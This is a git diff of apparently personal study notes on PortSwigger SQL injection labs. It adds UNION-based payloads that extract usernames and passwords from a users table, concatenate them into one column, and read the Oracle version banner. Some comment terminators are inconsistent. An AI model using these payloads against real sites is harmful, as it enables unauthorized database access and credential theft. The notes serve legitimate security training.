@@ -328,13 +328,50 @@ I manually convert string to which I need to show on website to `CHR()`
 
 
 ### Approaches
-* Try to transform this Payload to get Data from User's table (guess table is named `users`)
+Try to transform this Payload to get Data from User's table (guess table is named `users`): 
+`/filter?category=Gift''+UNION+SELECT+NULL,NULL,NULL+from+products-`
 
 ### Solution
 
-/filter?category=Gift'+UNION+SELECT+username,password+from+users--
-
+`/filter?category=Gift''+UNION+SELECT+username,password+from+users--`
 ![](assets/16524252667246.png)
+
+
+## SQL injection UNION attack, retrieving multiple values in a single column
+
+> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+> The database contains a different table called users, with columns called username and password.
+
+> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+### Approaches
+Try to adapt this Payload:
+`/filter?category=Gift'+UNION+SELECT+username,password+from+users-`
+
+### Solution
+
+1. Check how many columns are used in SQL Query: Start with `1` and go up until server gives error: `GET /filter?category='+ORDER+BY+2-- HTTP/1.1`
+2. `/filter?category='+UNION+SELECT+NULL,username+||+'~'+||+password+from+users----`
+
+![](assets/16524278144216.png)
+
+
+## SQL injection attack, querying the database type and version on Oracle
+
+> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+>
+> To solve the lab, display the database version string.
+
+
+### Approaches
+
+* Have to somehow this query in our Payload: `SELECT * FROM v$version`
+* Found hint in [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+### Solution
+
+`GET /filter?category='UNION+SELECT+NULL,banner+FROM+v$version--`
 
 
 # Server-side request forgery (SSRF)
